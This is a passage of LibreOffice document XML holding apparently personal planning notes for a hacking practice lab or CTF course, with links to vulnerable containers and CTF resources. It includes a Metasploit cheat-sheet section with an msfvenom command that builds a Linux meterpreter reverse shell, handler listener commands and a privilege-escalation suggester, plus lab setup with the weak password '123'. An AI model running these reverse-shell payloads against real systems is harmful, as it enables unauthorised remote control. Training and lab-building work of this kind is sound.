      <text:p text:style-name="P74">Loops throw the password and check caracter by caracter.</text:p>
      <text:p text:style-name="P69"/>
      <text:p text:style-name="P70">https://bugs.python.org/issue35909</text:p>
      <text:p text:style-name="P61"/>
      <text:p text:style-name="P31"/>
      <text:p text:style-name="P37"><text:bookmark-start text:name="__DdeLink__622_2786724775"/>---------------------------------------------------------------------------------<text:bookmark-end text:name="__DdeLink__622_2786724775"/></text:p>
      <text:p text:style-name="P31"/>
      <text:p text:style-name="P34">BEEF victim – <text:span text:style-name="T29">TODO – </text:span><text:span text:style-name="T30">understand how to exploit using metasploit.</text:span></text:p>
      <text:p text:style-name="P52">https://apprize.best/security/ethical_1/19.html</text:p>
      <text:p text:style-name="P32"/>
      <text:p text:style-name="P38"><text:bookmark-start text:name="__DdeLink__624_2786724775"/>---------------------------------------------------------------------------------<text:bookmark-end text:name="__DdeLink__624_2786724775"/></text:p>
      <text:p text:style-name="P32"/>
      <text:p text:style-name="P42">VM WITH PYTHON <text:span text:style-name="T47">SANBOX </text:span>CHALLENGE - <text:span text:style-name="T44">DONE</text:span>.</text:p>
      <text:p text:style-name="P65"/>
      <text:p text:style-name="P39"><text:bookmark-start text:name="__DdeLink__846_2392804040"/>---------------------------------------------------------------------------------<text:bookmark-start text:name="__DdeLink__848_2392804040"/><text:bookmark-end text:name="__DdeLink__846_2392804040"/><text:bookmark-end text:name="__DdeLink__848_2392804040"/></text:p>
      <text:p text:style-name="P39"/>
      <text:p text:style-name="P75">WINDOWS 7 VM</text:p>
      <text:p text:style-name="P75"/>
      <text:p text:style-name="P75">* ftp exploit from metasploit.</text:p>
      <text:p text:style-name="P75">* smb share to learn impacket.</text:p>
      <text:p text:style-name="P75">* maybe beef.</text:p>
      <text:p text:style-name="P55"/>
      <text:p text:style-name="P55">---------------------------------------------------------------------------------</text:p>
      <text:p text:style-name="P75"/>
      <text:p text:style-name="P39"/>
      <text:p text:style-name="P39"/>
      <text:p text:style-name="P43">More Concepts to incorperate:</text:p>
      <text:p text:style-name="P43"/>
      <text:p text:style-name="P35">* <text:span text:style-name="T38">Wireshark challenge – open TLS and do something with it.</text:span></text:p>
      <text:p text:style-name="P35">https://www.comparitech.com/net-admin/decrypt-ssl-with-wireshark/</text:p>
      <text:p text:style-name="P35"/>
      <text:p text:style-name="P35">* <text:span text:style-name="T27">Use john the ripper.</text:span></text:p>
      <text:p text:style-name="P32"/>
      <text:p text:style-name="P32">* <text:span text:style-name="T26">linux kernel local privelege escelation.</text:span></text:p>
      <text:p text:style-name="P32"/>
      <text:p text:style-name="P32">* <text:span text:style-name="T25">Maybe a reversing challenge from Google CTF </text:span><text:span text:style-name="T28">or other CTF</text:span><text:span text:style-name="T25">.</text:span></text:p>
      <text:p text:style-name="P32"/>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P33">===========================================================</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P62">more vulnerable containers:</text:p>
      <text:p text:style-name="P3">https://hub.docker.com/u/vulnerables</text:p>
      <text:p text:style-name="P28"/>
      <text:p text:style-name="P27">need to install docker and docker compose.</text:p>
      <text:p text:style-name="P25"/>
      <text:p text:style-name="P26">vulnhub.</text:p>
      <text:p text:style-name="P26">this is also very good: <text:bookmark-start text:name="__DdeLink__582_3349739104"/><text:a xlink:type="simple" xlink:href="https://github.com/vulhub" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://github.com/vulhub</text:a><text:bookmark-end text:name="__DdeLink__582_3349739104"/></text:p>
      <text:p text:style-name="P26">and this https://github.com/Ignitetechnologies/Vulnhub-CTF-Writeups</text:p>
      <text:p text:style-name="P3"><text:soft-page-break/></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P21">Think of exercises from here: <text:a xlink:type="simple" xlink:href="https://www.sjoerdlangkemper.nl/2018/12/19/practice-hacking-with-vulnerable-systems/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://www.sjoerdlangkemper.nl/2018/12/19/practice-hacking-with-vulnerable-systems/</text:a></text:p>
      <text:p text:style-name="P21"/>
      <text:p text:style-name="P23">this is also interesting: <text:a xlink:type="simple" xlink:href="https://www.root-me.org/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://www.root-me.org/</text:a>, <text:a xlink:type="simple" xlink:href="https://www.vulnhub.com/?page=2" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://www.vulnhub.com/?page=2</text:a></text:p>
      <text:p text:style-name="P23"><text:a xlink:type="simple" xlink:href="https://github.com/apsdehal/awesome-ctf" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://github.com/apsdehal/awesome-ctf</text:a> – in the end there are CTFs.</text:p>
      <text:p text:style-name="P23"/>
      <text:p text:style-name="P24">Maybe google ctf: <text:a xlink:type="simple" xlink:href="https://github.com/google/google-ctf" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://github.com/google/google-ctf</text:a> – <text:span text:style-name="T23">this is a hard one.</text:span></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P17">Take all the tools from kali linux.</text:p>
      <text:p text:style-name="P16"/>
      <text:p text:style-name="P16">Test with windows WSL or doker for windows.</text:p>
      <text:p text:style-name="P16"/>
      <text:p text:style-name="P22">Maybe powersploit.</text:p>
      <text:p text:style-name="P19"/>
      <text:p text:style-name="P20">Possibly have a windows 7 VM so they work with smb.<text:bookmark-start text:name="__DdeLink__52_3755670151"/><text:bookmark-end text:name="__DdeLink__52_3755670151"/></text:p>
      <text:p text:style-name="P51"/>
      <text:p text:style-name="P18">=========================</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P7">Things:</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P10">msfvenom cheatsheet: <text:bookmark-start text:name="__DdeLink__844_2392804040"/><text:a xlink:type="simple" xlink:href="https://redteamtutorials.com/2018/10/24/msfvenom-cheatsheet/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://redteamtutorials.com/2018/10/24/msfvenom-cheatsheet/</text:a><text:bookmark-end text:name="__DdeLink__844_2392804040"/></text:p>
      <text:p text:style-name="P12">metasploit cheatsheet.</text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P7">Metasploit: </text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T18"><text:tab/>create a conna</text:span><text:span text:style-name="T19">e</text:span><text:span text:style-name="T18">cting shell: </text:span><text:bookmark-start text:name="__DdeLink__8_3755670151"/><text:bookmark-start text:name="__DdeLink__802_2392804040"/><text:span text:style-name="T3">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f elf &gt; shell.elf</text:span><text:bookmark-end text:name="__DdeLink__8_3755670151"/><text:bookmark-end text:name="__DdeLink__802_2392804040"/></text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P57"><text:span text:style-name="T18"><text:tab/></text:span><text:span text:style-name="T20">setup a listener:</text:span></text:p>
      <text:p text:style-name="P13"/>
      <text:p text:style-name="P13"/>
      <text:p text:style-name="P13">$ ./msfconsole -q</text:p>
      <text:p text:style-name="P2">msf <text:span text:style-name="T21">&gt;</text:span> <text:bookmark-start text:name="__DdeLink__10_3755670151"/><text:bookmark-start text:name="__DdeLink__804_2392804040"/>use exploit/multi/handler<text:bookmark-end text:name="__DdeLink__10_3755670151"/><text:bookmark-end text:name="__DdeLink__804_2392804040"/></text:p>
      <text:p text:style-name="P2">msf exploit(handler) <text:span text:style-name="T21">&gt;</text:span> <text:bookmark-start text:name="__DdeLink__806_2392804040"/>set payload linux/x86/meterpreter/reverse_tcp<text:bookmark-end text:name="__DdeLink__806_2392804040"/></text:p>
      <text:p text:style-name="P45"><text:span text:style-name="T4">msf exploit(handler) </text:span><text:span text:style-name="T6">&gt;</text:span><text:span text:style-name="T4"> </text:span><text:bookmark-start text:name="__DdeLink__12_3755670151"/><text:bookmark-start text:name="__DdeLink__809_2392804040"/><text:span text:style-name="T7">set</text:span><text:span text:style-name="T4"> lhost </text:span><text:bookmark-end text:name="__DdeLink__12_3755670151"/><text:span text:style-name="T5">172.17.0.2</text:span><text:bookmark-end text:name="__DdeLink__809_2392804040"/></text:p>
      <text:p text:style-name="P2">lhost =<text:span text:style-name="T21">&gt;</text:span> 192.168.1.123</text:p>
      <text:p text:style-name="P2">msf exploit(handler) <text:span text:style-name="T21">&gt;</text:span> <text:span text:style-name="T22">set</text:span> lport 4444</text:p>
      <text:p text:style-name="P2">lport =<text:span text:style-name="T21">&gt;</text:span> 4444</text:p>
      <text:p text:style-name="P2">msf exploit(handler) <text:span text:style-name="T21">&gt;</text:span> run</text:p>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P11">metasploit put shell in background.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P60">Find local pe</text:p>
      <text:p text:style-name="P47"><text:bookmark-start text:name="__DdeLink__812_2392804040"/>post/multi/recon/local_exploit_suggest<text:bookmark-end text:name="__DdeLink__812_2392804040"/><text:span text:style-name="T35">er</text:span></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P4">To enable ssh connection:</text:p>
      <text:p text:style-name="P4"><text:soft-page-break/><text:tab/><text:span text:style-name="T17">when sudo: passwd with password 123</text:span></text:p>
      <text:p text:style-name="P4"><text:tab/>adduser moses <text:span text:style-name="T17">with password 123</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1"><text:tab/></text:span><text:bookmark-start text:name="__DdeLink__616_2786724775"/><text:bookmark-start text:name="__DdeLink__18_3755670151"/><text:bookmark-start text:name="__DdeLink__26_3755670151"/><text:bookmark-start text:name="__DdeLink__6_3755670151"/><text:bookmark-start text:name="__DdeLink__16_3755670151"/><text:bookmark-start text:name="__DdeLink__14_3755670151"/><text:span text:style-name="T1">usermod -aG sudo moses</text:span><text:bookmark-end text:name="__DdeLink__616_2786724775"/><text:bookmark-end text:name="__DdeLink__18_3755670151"/><text:bookmark-end text:name="__DdeLink__26_3755670151"/><text:bookmark-end text:name="__DdeLink__6_3755670151"/><text:bookmark-end text:name="__DdeLink__16_3755670151"/><text:bookmark-end text:name="__DdeLink__14_3755670151"/></text:p>
      <text:p text:style-name="P6"><text:tab/>look at: https://bencane.com/2013/07/22/ssh-disable-host-checking-for-scripts-automation/</text:p>
      <text:p text:style-name="P5"><text:tab/><text:span text:style-name="T16">change the file in the path: </text:span><text:bookmark-start text:name="__DdeLink__4_3755670151"/><text:bookmark text:name="__DdeLink__1_3755670151"/><text:span text:style-name="T2">/etc/ssh/sshd_config</text:span><text:bookmark-end text:name="__DdeLink__4_3755670151"/></text:p>
      <text:p text:style-name="P14"><text:tab/>put inside the following content:</text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P1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'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace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liberation mono', 'courier new', monospace"/>
    <style:font-face style:name="Monaco1" svg:font-family="Monaco, Consolas, 'Andale Mono', 'DejaVu Sans Mono', monospace"/>
    <style:font-face style:name="Monaco2" svg:font-family="Monaco, Menlo, Consolas, 'Courier New', monospace"/>
    <style:font-face style:name="Monaco" svg:font-family="Monaco, monospace"/>
    <style:font-face style:name="Roboto" svg:font-family="Roboto, sans-serif"/>
    <style:font-face style:name="SFMono-Regular" svg:font-family="SFMono-Regular, Consolas, 'Liberation Mono', Menlo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lato" svg:font-family="lato, sans-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7:38:42.908746563</meta:creation-date>
    <dc:date>2020-12-01T14:59:51.237818651</dc:date>
    <meta:editing-duration>P5DT20H16M</meta:editing-duration>
    <meta:editing-cycles>185</meta:editing-cycles>
    <meta:generator>LibreOffice/6.4.6.2$Linux_X86_64 LibreOffice_project/40$Build-2</meta:generator>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="4" meta:paragraph-count="93" meta:word-count="568" meta:character-count="4769" meta:non-whitespace-character-count="4271"/>
  </office:meta>
</office:document-meta>
</file>